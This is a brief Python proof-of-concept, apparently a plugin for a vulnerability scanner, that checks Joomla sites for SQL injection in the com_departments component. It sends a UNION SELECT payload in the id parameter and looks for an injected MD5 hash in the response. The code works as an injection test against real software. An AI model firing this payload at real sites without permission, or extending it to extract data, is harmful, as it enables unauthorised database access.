#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  joomla Component com_departments插件 SQL注入漏洞
References: http://sebug.net/vuldb/ssvid-19358
Author    :  ko0zhi
"""

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = 'index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5(3.1415),3,4,5,6,7,8--%20'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])